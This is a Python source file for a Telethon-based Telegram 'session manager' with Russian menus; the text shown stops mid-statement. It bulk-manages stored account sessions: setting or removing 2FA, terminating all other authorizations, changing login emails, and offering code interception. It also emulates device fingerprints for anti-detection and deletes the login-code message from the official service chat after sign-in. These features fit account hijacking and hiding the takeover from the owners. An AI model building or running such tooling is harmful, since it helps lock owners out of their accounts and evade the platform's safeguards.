import os
import sys
import re
import glob
import asyncio
import struct
from telethon import TelegramClient, errors, functions, types
from telethon.tl import TLObject
from telethon.tl.alltlobjects import tlobjects as _tlobjects
from config import API_ID, API_HASH

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
from rich.text import Text
from rich.columns import Columns
from rich.align import Align
from rich.live import Live
from rich.layout import Layout
from rich.rule import Rule
from rich.style import Style
from rich.box import ROUNDED, HEAVY, DOUBLE, SIMPLE_HEAVY, MINIMAL_DOUBLE_HEAD
from rich import box

# ── Anti-detection: device эмуляция ──
from device import get_device_for_session

console = Console()

SESSIONS_DIR = "sessions"

if not os.path.exists(SESSIONS_DIR):
    os.makedirs(SESSIONS_DIR)


# ───────── RAW TL: Login Email ─────────
class TLBytes(TLObject):
    @staticmethod
    def _serialize_bytes_to(data):
        if isinstance(data, str):
            data = data.encode('utf-8')
        r = b''
        if len(data) < 254:
            r += bytes([len(data)])
            r += data
            padding = (len(r)) % 4
            if padding:
                r += b'\x00' * (4 - padding)
        else:
            r += b'\xfe'
            r += len(data).to_bytes(3, 'little')
            r += data
            padding = (len(r)) % 4
            if padding:
                r += b'\x00' * (4 - padding)
        return r


class RawEmailVerifyPurposeLoginChange(TLObject):
    CONSTRUCTOR_ID = 0x527d706a
    SUBCLASS_OF_ID = 0x1b2b1930
    def _bytes(self):
        return struct.pack('<I', 0x527d706a)
    @classmethod
    def from_reader(cls, reader):
        return cls()


class RawSendVerifyEmailCode(TLObject):
    CONSTRUCTOR_ID = 0x98e037bb
    SUBCLASS_OF_ID = 0xbf3bac0e
    def __init__(self, purpose, email):
        self.purpose = purpose
        self.email = email
    def _bytes(self):
        return (struct.pack('<I', 0x98e037bb) +
                self.purpose._bytes() +
                TLBytes._serialize_bytes_to(self.email))
    @classmethod
    def from_reader(cls, reader):
        return cls(purpose=None, email='')


class RawEmailVerificationCode(TLObject):
    CONSTRUCTOR_ID = 0x922e55a9
    SUBCLASS_OF_ID = 0xb32e2e0a
    def __init__(self, code):
        self.code = code
    def _bytes(self):
        return (struct.pack('<I', 0x922e55a9) +
                TLBytes._serialize_bytes_to(self.code))
    @classmethod
    def from_reader(cls, reader):
        return cls(code=reader.tgread_string())


class RawVerifyEmail(TLObject):
    CONSTRUCTOR_ID = 0x32da4f5c
    SUBCLASS_OF_ID = 0xbf3bac0e
    def __init__(self, purpose, verification):
        self.purpose = purpose
        self.verification = verification
    def _bytes(self):
        return (struct.pack('<I', 0x32da4f5c) +
                self.purpose._bytes() +
                self.verification._bytes())
    @classmethod
    def from_reader(cls, reader):
        return cls(purpose=None, verification=None)


class RawSentEmailCode(TLObject):
    CONSTRUCTOR_ID = 0x811f854f
    def __init__(self, email_pattern='', length=0):
        self.email_pattern = email_pattern
        self.length = length
    def _bytes(self):
        return b''
    @classmethod
    def from_reader(cls, reader):
        return cls(email_pattern=reader.tgread_string(),
                   length=reader.read_int())


class RawEmailVerified(TLObject):
    CONSTRUCTOR_ID = 0x2b96cd1b
    def __init__(self, email=''):
        self.email = email
    def _bytes(self):
        return b''
    @classmethod
    def from_reader(cls, reader):
        return cls(email=reader.tgread_string())


class RawEmailVerifiedLogin(TLObject):
    CONSTRUCTOR_ID = 0xe1bb0d61
    def __init__(self, email='', sent_code=None):
        self.email = email
        self.sent_code = sent_code
    def _bytes(self):
        return b''
    @classmethod
    def from_reader(cls, reader):
        return cls(email=reader.tgread_string(),
                   sent_code=reader.tgread_object())


for _c in [RawSentEmailCode, RawEmailVerified, RawEmailVerifiedLogin,
           RawEmailVerifyPurposeLoginChange, RawSendVerifyEmailCode,
           RawEmailVerificationCode, RawVerifyEmail]:
    _tlobjects[_c.CONSTRUCTOR_ID] = _c


# ───────── ФАБРИКА КЛИЕНТОВ (ANTI-DETECTION) ─────────

def create_client(session_path: str, **kwargs) -> TelegramClient:
    """
    Создаёт TelegramClient с единым Desktop профилем.
    Device параметры совпадают с TG REAPER → сессии не слетают.

    kwargs могут переопределить параметры соединения,
    но НЕ могут переопределить device параметры (защита).
    """
    device = get_device_for_session(session_path)

    defaults = {
        "device_model": device["device_model"],
        "system_version": device["system_version"],
        "app_version": device["app_version"],
        "lang_code": device["lang_code"],
        "system_lang_code": device["system_lang_code"],
        "flood_sleep_threshold": 60,
        "request_retries": 5,
        "connection_retries": 5,
        "retry_delay": 1,
        "auto_reconnect": True,
        "timeout": 30,
        "receive_updates": True,
    }

    # Защита: kwargs НЕ могут изменить device параметры
    protected_keys = {
        "device_model", "system_version", "app_version",
        "lang_code", "system_lang_code",
    }
    safe_kwargs = {
        k: v for k, v in kwargs.items()
        if k not in protected_keys
    }
    defaults.update(safe_kwargs)

    return TelegramClient(
        session_path,
        API_ID,
        API_HASH,
        **defaults,
    )


# ───────── УТИЛИТЫ ─────────

def get_session_files():
    pattern = os.path.join(SESSIONS_DIR, "*.session")
    files = glob.glob(pattern)
    return [os.path.splitext(os.path.basename(f))[0] for f in files]


def get_client(session_name):
    """Возвращает клиент с единым Desktop профилем."""
    session_path = os.path.join(SESSIONS_DIR, session_name)
    return create_client(session_path)


def format_seconds(sec):
    if sec < 60:
        return f"{sec}с"
    elif sec < 3600:
        return f"{sec // 60}м {sec % 60}с"
    else:
        h = sec // 3600
        m = (sec % 3600) // 60
        return f"{h}ч {m}м"


def format_phone(phone):
    if not phone:
        return "—"
    phone = str(phone)
    if not phone.startswith("+"):
        phone = "+" + phone
    return phone


def parse_selection(input_str, total_count):
    input_str = input_str.strip()
    if not input_str:
        return list(range(total_count))
    indices = []
    parts = input_str.replace(" ", "").split(",")
    for part in parts:
        try:
            num = int(part)
            if num < 1 or num > total_count:
                return None
            indices.append(num - 1)
        except ValueError:
            return None
    return list(dict.fromkeys(indices))


def header(title: str):
    console.clear()
    console.print()
    console.print(Panel(
        Align.center(Text(title, style="bold white")),
        border_style="cyan",
        box=DOUBLE,
        padding=(1, 4),
    ))
    console.print()


def wait_enter():
    console.print()
    Prompt.ask("[dim]  Enter для продолжения[/]", default="")


def no_sessions():
    console.print("  [red]❌ Нет сессий в папке sessions/[/]")
    wait_enter()


# ───────── БАННЕР ─────────

def print_banner():
    banner_lines = [
        "[bold bright_cyan]███████╗███████╗███████╗███████╗██╗ ██████╗ ███╗   ██╗[/]",
        "[bold bright_cyan]██╔════╝██╔════╝██╔════╝██╔════╝██║██╔═══██╗████╗  ██║[/]",
        "[bold bright_cyan]███████╗█████╗  ███████╗███████╗██║██║   ██║██╔██╗ ██║[/]",
        "[bold bright_cyan]╚════██║██╔══╝  ╚════██║╚════██║██║██║   ██║██║╚██╗██║[/]",
        "[bold bright_cyan]███████║███████╗███████║███████║██║╚██████╔╝██║ ╚████║[/]",
        "[bold bright_cyan]╚══════╝╚══════╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝[/]",
        "",
        "[bold bright_cyan]███╗   ███╗ █████╗ ███╗   ██╗ █████╗  ██████╗ ███████╗██████╗[/]",
        "[bold bright_cyan]████╗ ████║██╔══██╗████╗  ██║██╔══██╗██╔════╝ ██╔════╝██╔══██╗[/]",
        "[bold bright_cyan]██╔████╔██║███████║██╔██╗ ██║███████║██║  ███╗█████╗  ██████╔╝[/]",
        "[bold bright_cyan]██║╚██╔╝██║██╔══██║██║╚██╗██║██╔══██║██║   ██║██╔══╝  ██╔══██╗[/]",
        "[bold bright_cyan]██║ ╚═╝ ██║██║  ██║██║ ╚████║██║  ██║╚██████╔╝███████╗██║  ██║[/]",
        "[bold bright_cyan]╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝[/]",
        "",
        "[white]                          __|__                         [/]",
        "[white]                   --o--o--(_)--o--o--                  [/]",
        "[bright_cyan]                  ✈  ·  ·  ·  ·  ·  ✈                  [/]",
        "",
        "[dim bright_white]           ╔══════════════════════════════════╗          [/]",
        "[dim bright_white]           ║  account session manager tool    ║          [/]",
        "[dim bright_white]           ╚══════════════════════════════════╝          [/]",
    ]

    banner_text = "\n".join(banner_lines)

    console.print(Panel(
        Align.center(banner_text),
        border_style="bright_cyan",
        box=DOUBLE,
        padding=(1, 2),
    ))


# ───────── ГЛАВНОЕ МЕНЮ ─────────

def print_menu():
    console.clear()
    console.print()

    print_banner()

    console.print()

    table = Table(
        show_header=False,
        box=ROUNDED,
        border_style="bright_blue",
        padding=(0, 3),
        title="[bold bright_cyan]Главное меню[/]",
        title_style="bold",
        min_width=52,
    )
    table.add_column("key", style="bold yellow", width=6, justify="center")
    table.add_column("desc", style="white")

    table.add_row("1", "Создать новую сессию")
    table.add_row("2", "Управление облачным паролем (2FA)")
    table.add_row("3", "Удалить все авторизации")
    table.add_row("4", "Сменить Login Email — все сессии")
    table.add_row("5", "Сменить Login Email — выбор сессий")
    table.add_row("6", "Список всех сессий")
    table.add_row("7", "Получить код входа по номеру")
    table.add_row("8", "Перехватить код через сессию")
    table.add_row("", "")
    table.add_row("0", "[dim]Выход[/]")

    console.print(Align.center(table))
    console.print()


# ───────── 1. СОЗДАНИЕ СЕССИИ ─────────

async def create_session():
    header("СОЗДАНИЕ НОВОЙ СЕССИИ")

    phone = Prompt.ask("  [cyan]Номер телефона (с +)[/]").strip()
    if not phone.startswith("+"):
        phone = "+" + phone
    session_name = phone.replace("+", "").replace(" ", "").replace("-", "")
    session_path = os.path.join(SESSIONS_DIR, session_name)

    client = create_client(session_path)

    device = get_device_for_session(session_path)
    console.print(f"  [dim]📱 Device: {device['device_model']} | {device['system_version']}[/]")
    console.print(f"  [dim]📦 App: {device['app_version']}[/]")
    console.print()

    await client.connect()

    try:
        with console.status("[cyan]Отправка кода...[/]", spinner="dots"):
            await client.send_code_request(phone)

        console.print(f"  [green]✅ Код отправлен на[/] [bold]{phone}[/]")
        console.print()

        code = Prompt.ask("  [cyan]Код из Telegram[/]").strip()

        try:
            await client.sign_in(phone, code)
        except errors.SessionPasswordNeededError:
            console.print("  [yellow]⚠️  Аккаунт защищён 2FA[/]")
            password = Prompt.ask("  [cyan]Облачный пароль[/]", password=True).strip()
            await client.sign_in(password=password)

        me = await client.get_me()

        info_table = Table(box=ROUNDED, border_style="green",
                           show_header=False, padding=(0, 2))
        info_table.add_column("k", style="dim")
        info_table.add_column("v", style="bold")
        info_table.add_row("Имя", me.first_name or "—")
        info_table.add_row("Username", f"@{me.username}" if me.username else "—")
        info_table.add_row("ID", str(me.id))
        info_table.add_row("Файл", f"sessions/{session_name}.session")
        info_table.add_row("Device", device["device_model"])
        console.print()
        console.print(Panel(info_table, title="[green]✅ Вход выполнен[/]",
                            border_style="green"))

        try:
            await asyncio.sleep(2)
            async for dialog in client.iter_dialogs():
                if dialog.entity.id == 777000:
                    async for message in client.iter_messages(777000, limit=5):
                        if code in (message.text or ""):
                            await message.delete()
                            console.print("  [dim]🗑️  Сообщение с кодом удалено[/]")
                            break
                    break
        except Exception:
            pass

    except errors.PhoneNumberInvalidError:
        console.print("  [red]❌ Неверный номер[/]")
    except errors.PhoneCodeInvalidError:
        console.print("  [red]❌ Неверный код[/]")
    except errors.FloodWaitError as e:
        console.print(f"  [red]❌ Flood wait {format_seconds(e.seconds)}[/]")
    except Exception as e:
        console.print(f"  [red]❌ Ошибка: {e}[/]")
    finally:
        await client.disconnect()

    wait_enter()


# ───────── 2. ОБЛАЧНЫЙ ПАРОЛЬ ─────────

async def process_single_session_2fa(session_name):
    client = get_client(session_name)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            console.print(f"  [red]❌ {session_name} не авторизован[/]")
            return
        me = await client.get_me()

        console.print(Rule(
            f"[bold]{me.first_name}[/] [dim]({session_name})[/]",
            style="cyan",
        ))

        pwd_info = await client(functions.account.GetPasswordRequest())
        if pwd_info.has_password:
            console.print("  2FA: [green]УСТАНОВЛЕН[/]")
            console.print()
            console.print("  [yellow][1][/] Изменить   "
                          "[yellow][2][/] Удалить   "
                          "[dim][0] Пропуск[/]")
            action = Prompt.ask("  [cyan]Действие[/]",
                                choices=["0", "1", "2"], default="0")

            if action == "1":
                old = Prompt.ask("  [cyan]Текущий пароль[/]",
                                 password=True).strip()
                new = Prompt.ask("  [cyan]Новый пароль[/]",
                                 password=True).strip()
                conf = Prompt.ask("  [cyan]Подтвердите[/]",
                                  password=True).strip()
                if new != conf:
                    console.print("  [red]❌ Пароли не совпадают[/]")
                else:
                    try:
                        await client.edit_2fa(current_password=old,
                                              new_password=new, hint="")
                        console.print("  [green]✅ Пароль изменён[/]")
                    except errors.PasswordHashInvalidError:
                        console.print("  [red]❌ Неверный текущий пароль[/]")
                    except Exception as e:
                        console.print(f"  [red]❌ {e}[/]")

            elif action == "2":
                old = Prompt.ask("  [cyan]Текущий пароль[/]",
                                 password=True).strip()
                try:
                    await client.edit_2fa(current_password=old,
                                          new_password=None)
                    console.print("  [green]✅ 2FA удалён[/]")
                except errors.PasswordHashInvalidError:
                    console.print("  [red]❌ Неверный пароль[/]")
                except Exception as e:
                    console.print(f"  [red]❌ {e}[/]")
        else:
            console.print("  2FA: [red]НЕ УСТАНОВЛЕН[/]")
            new = Prompt.ask("  [cyan]Новый пароль[/]",
                             password=True).strip()
            conf = Prompt.ask("  [cyan]Подтвердите[/]",
                              password=True).strip()
            if new != conf:
                console.print("  [red]❌ Не совпадают[/]")
            elif not new:
                console.print("  [red]❌ Пустой пароль[/]")
            else:
                try:
                    await client.edit_2fa(current_password=None,
                                          new_password=new, hint="")
                    console.print("  [green]✅ 2FA установлен[/]")
                except Exception as e:
                    console.print(f"  [red]❌ {e}[/]")
    except Exception as e:
        console.print(f"  [red]❌ {e}[/]")
    finally:
        await client.disconnect()


async def manage_cloud_password():
    header("УПРАВЛЕНИЕ ОБЛАЧНЫМ ПАРОЛЕМ (2FA)")

    sessions = get_session_files()
    if not sessions:
        no_sessions()
        return

    table = Table(box=ROUNDED, border_style="blue",
                  show_header=False, padding=(0, 2))
    table.add_column("#", style="yellow bold", width=5, justify="center")
    table.add_column("Сессия", style="white")
    for i, s in enumerate(sessions, 1):
        table.add_row(str(i), s)
    console.print(table)
    console.print("  [dim]Номера через запятую или пусто = все[/]")
    console.print()

    choice = Prompt.ask("  [cyan]Выбор[/]", default="").strip()
    selected = parse_selection(choice, len(sessions))
    if selected is None:
        console.print("  [red]❌ Неверный ввод[/]")
        wait_enter()
        return

    sel = [sessions[i] for i in selected]
    console.print(f"  [green]Выбрано: {len(sel)}[/]")
    console.print()
    console.print("  [yellow][1][/] Индивидуально   [yellow][2][/] Массово")
    mode = Prompt.ask("  [cyan]Режим[/]", choices=["1", "2"])

    if mode == "1":
        for s in sel:
            await process_single_session_2fa(s)

    elif mode == "2":
        console.print()
        console.print("  [yellow][1][/] Установить/изменить   "
                      "[yellow][2][/] Удалить")
        action = Prompt.ask("  [cyan]Действие[/]", choices=["1", "2"])

        if action == "1":
            old = Prompt.ask(
                "  [cyan]Текущий пароль (пусто если нет 2FA)[/]",
                default="", password=True,
            ).strip()
            new = Prompt.ask("  [cyan]Новый пароль[/]",
                             password=True).strip()
            conf = Prompt.ask("  [cyan]Подтвердите[/]",
                              password=True).strip()
            if new != conf:
                console.print("  [red]❌ Не совпадают[/]")
            elif not new:
                console.print("  [red]❌ Пустой пароль[/]")
            else:
                console.print()
                for s in sel:
                    client = get_client(s)
                    try:
                        await client.connect()
                        if not await client.is_user_authorized():
                            console.print(
                                f"  [yellow]⚠️  {s} — не авторизован[/]")
                            continue
                        me = await client.get_me()
                        d = f"{s} ({me.first_name})"
                        pwd = await client(
                            functions.account.GetPasswordRequest())
                        if pwd.has_password:
                            if not old:
                                console.print(
                                    f"  [yellow]⚠️  {d} — "
                                    f"нужен старый пароль[/]")
                                continue
                            try:
                                await client.edit_2fa(
                                    current_password=old,
                                    new_password=new, hint="")
                                console.print(
                                    f"  [green]✅ {d} — изменён[/]")
                            except errors.PasswordHashInvalidError:
                                console.print(
                                    f"  [red]❌ {d} — "
                                    f"неверный пароль[/]")
                        else:
                            try:
                                await client.edit_2fa(
                                    current_password=None,
                                    new_password=new, hint="")
                                console.print(
                                    f"  [green]✅ {d} — установлен[/]")
                            except Exception as e:
                                console.print(
                                    f"  [red]❌ {d} — {e}[/]")
                    except Exception as e:
                        console.print(f"  [red]❌ {s} — {e}[/]")
                    finally:
                        await client.disconnect()
                    await asyncio.sleep(0.5)

        elif action == "2":
            pwd = Prompt.ask("  [cyan]Текущий пароль[/]",
                             password=True).strip()
            if not pwd:
                console.print("  [red]❌ Пароль обязателен[/]")
            else:
                console.print()
                for s in sel:
                    client = get_client(s)
                    try:
                        await client.connect()
                        if not await client.is_user_authorized():
                            console.print(
                                f"  [yellow]⚠️  {s} — не авторизован[/]")
                            continue
                        me = await client.get_me()
                        d = f"{s} ({me.first_name})"
                        p = await client(
                            functions.account.GetPasswordRequest())
                        if not p.has_password:
                            console.print(
                                f"  [dim]ℹ️  {d} — нет 2FA[/]")
                            continue
                        try:
                            await client.edit_2fa(
                                current_password=pwd,
                                new_password=None)
                            console.print(
                                f"  [green]✅ {d} — удалён[/]")
                        except errors.PasswordHashInvalidError:
                            console.print(
                                f"  [red]❌ {d} — неверный пароль[/]")
                    except Exception as e:
                        console.print(f"  [red]❌ {s} — {e}[/]")
                    finally:
                        await client.disconnect()
                    await asyncio.sleep(0.5)

    wait_enter()


# ───────── 3. УДАЛИТЬ ВСЕ АВТОРИЗАЦИИ ─────────

async def terminate_all_sessions():
    while True:
        header("УДАЛЕНИЕ ВСЕХ АВТОРИЗАЦИЙ")

        sessions = get_session_files()
        if not sessions:
            no_sessions()
            return

        table = Table(
            title="[bold]Обзор авторизаций[/]",
            box=ROUNDED,
            border_style="blue",
            header_style="bold cyan",
            padding=(0, 1),
        )
        table.add_column("#", style="yellow bold", width=4,
                         justify="center")
        table.add_column("Сессия", style="white", min_width=16)
        table.add_column("Имя", style="bright_white", min_width=14)
        table.add_column("Всего", style="cyan", justify="center",
                         width=7)
        table.add_column("Других", justify="center", width=8)

        session_data = []

        with console.status("[cyan]Загрузка данных...[/]", spinner="dots"):
            for i, s in enumerate(sessions, 1):
                client = get_client(s)
                try:
                    await client.connect()
                    if await client.is_user_authorized():
                        me = await client.get_me()
                        result = await client(
                            functions.account.GetAuthorizationsRequest())
                        total = len(result.authorizations)
                        others = [a for a in result.authorizations
                                  if not a.current]
                        name = ((me.first_name or "") + " " +
                                (me.last_name or "")).strip()[:16]
                        others_style = ("green" if len(others) == 0
                                        else "red bold")
                        table.add_row(
                            str(i), s, name, str(total),
                            f"[{others_style}]{len(others)}[/]")
                        session_data.append((s, me, others))
                    else:
                        table.add_row(
                            str(i), s, "[red]НЕ АВТОРИЗОВАН[/]",
                            "—", "—")
                        session_data.append((s, None, []))
                except Exception as e:
                    table.add_row(str(i), s, f"[red]ОШИБКА[/]",
                                  "—", "—")
                    session_data.append((s, None, []))
                finally:
                    await client.disconnect()

        console.print(table)
        console.print()

        total_others = sum(len(d[2]) for d in session_data)

        if total_others == 0:
            console.print(Panel(
                "[green]✅ Нет чужих авторизаций — "
                "только текущие сессии[/]",
                border_style="green",
            ))
            wait_enter()
            return

        console.print(
            f"  Всего чужих авторизаций: [bold red]{total_others}[/]")
        console.print()

        confirm = Prompt.ask(
            "  [cyan]Удалить ВСЕ другие авторизации?[/]",
            choices=["да", "нет"], default="нет")
        if confirm != "да":
            return

        console.print()
        total_removed = 0
        total_failed = 0
        failed_reasons = []

        for s, me, others in session_data:
            if me is None or not others:
                continue
            client = get_client(s)
            try:
                await client.connect()
                if not await client.is_user_authorized():
                    continue
                display = f"{s} ({me.first_name})"
                removed = 0
                failed = 0
                fail_msgs = []

                for auth in others:
                    try:
                        await client(
                            functions.account.ResetAuthorizationRequest(
                                hash=auth.hash))
                        removed += 1
                        await asyncio.sleep(0.3)
                    except errors.FloodWaitError as e:
                        fail_msgs.append(
                            f"flood wait {format_seconds(e.seconds)}")
                        failed += 1
                    except errors.FreshResetAuthorisationForbiddenError:
                        fail_msgs.append(
                            "сессия слишком новая (24ч)")
                        failed += 1
                    except errors.RPCError as e:
                        err = str(e).upper()
                        if "FRESH_RESET" in err:
                            fail_msgs.append(
                                "сессия слишком новая (24ч)")
                        elif "HASH_INVALID" in err:
                            fail_msgs.append("невалидный hash")
                        elif "FLOOD" in err:
                            m = re.search(r'(\d+)', str(e))
                            t = int(m.group(1)) if m else 0
                            fail_msgs.append(
                                f"flood wait {format_seconds(t)}"
                                if t else "слишком много запросов")
                        else:
                            fail_msgs.append(str(e))
                        failed += 1
                    except Exception as e:
                        fail_msgs.append(str(e))
                        failed += 1

                total_removed += removed
                total_failed += failed

                if removed > 0 and failed == 0:
                    console.print(
                        f"  [green]✅ {display}[/] — "
                        f"удалено {removed}/{len(others)}")
                elif removed > 0 and failed > 0:
                    unique = list(dict.fromkeys(fail_msgs))
                    console.print(
                        f"  [yellow]⚠️  {display}[/] — "
                        f"удалено {removed}, ошибок {failed}")
                    console.print(
                        f"     [dim]{'; '.join(unique)}[/]")
                elif failed > 0:
                    unique = list(dict.fromkeys(fail_msgs))
                    console.print(
                        f"  [red]❌ {display}[/] — "
                        f"не удалось: {failed}")
                    console.print(
                        f"     [dim]{'; '.join(unique)}[/]")

                if fail_msgs:
                    failed_reasons.extend(fail_msgs)

            except Exception as e:
                console.print(f"  [red]❌ {s} — {e}[/]")
            finally:
                await client.disconnect()

        console.print()
        summary = Table(show_header=False, box=ROUNDED,
                        border_style="cyan", padding=(0, 2))
        summary.add_column("", style="bold")
        summary.add_column("")
        summary.add_row("[green]✅ Удалено[/]", str(total_removed))
        summary.add_row("[red]❌ Ошибок[/]", str(total_failed))
        console.print(summary)

        if failed_reasons:
            unique = list(dict.fromkeys(failed_reasons))
            console.print()
            console.print("  [dim]Причины:[/]")
            for r in unique:
                console.print(f"    [dim]• {r}[/]")

        console.print()
        console.print("  [dim]Обновляю список...[/]")
        await asyncio.sleep(2)


# ───────── EMAIL LOGIN утилиты ─────────

async def send_login_email_code(client, email):
    return await client(RawSendVerifyEmailCode(
        purpose=RawEmailVerifyPurposeLoginChange(), email=email))


async def verify_login_email(client, code):
    return await client(RawVerifyEmail(
        purpose=RawEmailVerifyPurposeLoginChange(),
        verification=RawEmailVerificationCode(code=code)))


async def change_login_email_single(client, session_name, me, new_email):
    display = f"{session_name} ({me.first_name})"
    try:
        result = await send_login_email_code(client, new_email)
        email_pattern = getattr(result, 'email_pattern', new_email)
        code_length = getattr(result, 'length', 0)

        console.print(f"  [cyan]📧 {display}[/]")
        console.print(
            f"     Код → [bold]{email_pattern}[/]", end="")
        if code_length:
            console.print(f"  [dim](длина: {code_length})[/]")
        else:
            console.print()

        email_code = Prompt.ask(
            "     [cyan]Код (пусто = пропуск)[/]",
            default="").strip()
        if not email_code:
            console.print("     [dim]⏭️  Пропуск[/]")
            return False
        try:
            vr = await verify_login_email(client, email_code)
            verified = getattr(vr, 'email', new_email)
            console.print(
                f"     [green]✅ Login Email → {verified}[/]")
            return True
        except Exception as e:
            err = str(e).upper()
            if "CODE_INVALID" in err or "CODE_EXPIRED" in err:
                console.print(
                    "     [red]❌ Неверный/просроченный код[/]")
            else:
                console.print(f"     [red]❌ {e}[/]")
            return False
    except Exception as e:
        err = str(e).upper()
        if "EMAIL_INVALID" in err:
            console.print(
                f"  [red]❌ {display} — неверный email[/]")
        elif "FLOOD" in err:
            console.print(
                f"  [red]❌ {display} — flood wait[/]")
        else:
            console.print(f"  [red]❌ {display} — {e}[/]")
        return False


async def process_login_email_for_sessions(selected_sessions, new_email):
    success = fail = 0
    for session_name in selected_sessions:
        client = get_client(session_name)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                console.print(
                    f"  [yellow]⚠️  {session_name} — "
                    f"не авторизован[/]")
                fail += 1
                continue
            me = await client.get_me()
            if await change_login_email_single(
                    client, session_name, me, new_email):
                success += 1
            else:
                fail += 1
        except Exception as e:
            console.print(f"  [red]❌ {session_name} — {e}[/]")
            fail += 1
        finally:
            await client.disconnect()
        await asyncio.sleep(1)

    console.print()
    summary = Table(show_header=False, box=ROUNDED,
                    border_style="cyan", padding=(0, 2))
    summary.add_column("", style="bold")
    summary.add_column("")
    summary.add_row("[green]✅ Успешно[/]", str(success))
    summary.add_row("[red]❌ Ошибок[/]", str(fail))
    console.print(summary)


# ───────── 4. EMAIL LOGIN (ВСЕ) ─────────

async def set_login_email_all():
    header("СМЕНА EMAIL LOGIN — ВСЕ СЕССИИ")
    console.print("  [dim]ℹ️  Облачный пароль НЕ затрагивается[/]")
    console.print()

    sessions = get_session_files()
    if not sessions:
        no_sessions()
        return

    console.print(f"  Сессий: [bold]{len(sessions)}[/]")
    for s in sessions:
        console.print(f"    [dim]•[/] {s}")
    console.print()

    new_email = Prompt.ask("  [cyan]Email[/]").strip()
    if not new_email or "@" not in new_email:
        console.print("  [red]❌ Неверный email[/]")
        wait_enter()
        return

    confirm = Prompt.ask(
        f"  Установить [bold]{new_email}[/] "
        f"для [bold]{len(sessions)}[/] сессий?",
        choices=["да", "нет"], default="нет",
    )
    if confirm != "да":
        wait_enter()
        return
    console.print()
    await process_login_email_for_sessions(sessions, new_email)
    wait_enter()


# ───────── 5. EMAIL LOGIN (ВЫБОР) ─────────

async def set_login_email_selected():
    header("СМЕНА EMAIL LOGIN — ВЫБОР СЕССИЙ")
    console.print("  [dim]ℹ️  Облачный пароль НЕ затрагивается[/]")
    console.print()

    sessions = get_session_files()
    if not sessions:
        no_sessions()
        return

    table = Table(
        title="[bold]Сессии[/]",
        box=ROUNDED,
        border_style="blue",
        header_style="bold cyan",
        padding=(0, 1),
    )
    table.add_column("#", style="yellow bold", width=4, justify="center")
    table.add_column("Сессия", style="white", min_width=16)
    table.add_column("Телефон", style="bright_white", min_width=16)
    table.add_column("Имя", style="white", min_width=12)
    table.add_column("Устр.", style="cyan", justify="center", width=6)
    table.add_column("Login Email", style="magenta")

    with console.status("[cyan]Загрузка...[/]", spinner="dots"):
        for i, s in enumerate(sessions, 1):
            client = get_client(s)
            try:
                await client.connect()
                if await client.is_user_authorized():
                    me = await client.get_me()
                    name = ((me.first_name or "") + " " +
                            (me.last_name or "")).strip()[:14]
                    phone = format_phone(me.phone)
                    try:
                        result = await client(
                            functions.account.GetAuthorizationsRequest())
                        devices = str(len(result.authorizations))
                    except:
                        devices = "?"
                    try:
                        pwd_info = await client(
                            functions.account.GetPasswordRequest())
                        login_email = (
                            getattr(pwd_info, 'login_email_pattern', '')
                            or "—")
                    except:
                        login_email = "?"
                    table.add_row(str(i), s, phone, name,
                                  devices, login_email)
                else:
                    table.add_row(str(i), s,
                                  "[red]НЕ АВТОРИЗОВАН[/]",
                                  "", "", "")
            except:
                table.add_row(str(i), s, "[red]ОШИБКА[/]",
                              "", "", "")
            finally:
                await client.disconnect()

    console.print(table)
    console.print("  [dim]Номера через запятую или пусто = все[/]")
    console.print()

    choice = Prompt.ask("  [cyan]Выбор[/]", default="").strip()
    selected = parse_selection(choice, len(sessions))
    if selected is None:
        console.print("  [red]❌ Неверный ввод[/]")
        wait_enter()
        return

    sel = [sessions[i] for i in selected]
    console.print(f"  [green]Выбрано: {len(sel)}[/]")
    for s in sel:
        console.print(f"    [dim]•[/] {s}")
    console.print()

    new_email = Prompt.ask("  [cyan]Email[/]").strip()
    if not new_email or "@" not in new_email:
        console.print("  [red]❌ Неверный email[/]")
        wait_enter()
        return
    console.print()
    await process_login_email_for_sessions(sel, new_email)
    wait_enter()


# ───────── 6. СПИСОК СЕССИЙ ─────────

async def list_sessions():
    header("СПИСОК ВСЕХ СЕССИЙ")

    sessions = get_session_files()
    if not sessions:
        no_sessions()
        return

    table = Table(
        title=f"[bold]Всего: {len(sessions)}[/]",
        box=ROUNDED,
        border_style="bright_blue",
        header_style="bold cyan",
        padding=(0, 1),
        show_lines=True,
    )
    table.add_column("#", style="yellow bold", width=4, justify="center")
    table.add_column("Файл", style="white", min_width=14)
    table.add_column("Телефон", style="bright_white", min_width=16)
    table.add_column("Имя", style="white", min_width=12)
    table.add_column("Username", style="bright_cyan", min_width=13)
    table.add_column("ID", style="dim", min_width=11)
    table.add_column("2FA", justify="center", width=4)
    table.add_column("Устр.", style="cyan", justify="center", width=5)
    table.add_column("Email", style="magenta", max_width=30)
    table.add_column("Device", style="dim", max_width=22)

    with console.status("[cyan]Загрузка данных сессий...[/]",
                        spinner="dots"):
        for i, session_name in enumerate(sessions, 1):
            client = get_client(session_name)

            session_path = os.path.join(SESSIONS_DIR, session_name)
            device = get_device_for_session(session_path)
            device_short = device["device_model"][:20]

            try:
                await client.connect()
                if await client.is_user_authorized():
                    me = await client.get_me()
                    name = ((me.first_name or "") + " " +
                            (me.last_name or "")).strip()[:14]
                    username = (f"@{me.username}"
                                if me.username else "—")
                    phone = format_phone(me.phone)

                    try:
                        result = await client(
                            functions.account
                            .GetAuthorizationsRequest())
                        devices = str(len(result.authorizations))
                    except:
                        devices = "?"

                    try:
                        pwd_info = await client(
                            functions.account.GetPasswordRequest())
                        has_2fa = ("[green]✅[/]"
                                   if pwd_info.has_password
                                   else "[red]❌[/]")
                        has_recovery = getattr(
                            pwd_info, 'has_recovery', False)
                        pending = (
                            pwd_info.email_unconfirmed_pattern or "")
                        login_email = (
                            getattr(pwd_info,
                                    'login_email_pattern', '')
                            or "")
                        parts = []
                        if login_email:
                            parts.append(f"login:{login_email}")
                        if has_recovery:
                            parts.append("rcv:✅")
                        elif pending:
                            parts.append(f"rcv:⏳{pending}")
                        email_status = (" | ".join(parts)
                                        if parts else "[dim]—[/]")
                    except:
                        has_2fa = "?"
                        email_status = "?"

                    table.add_row(
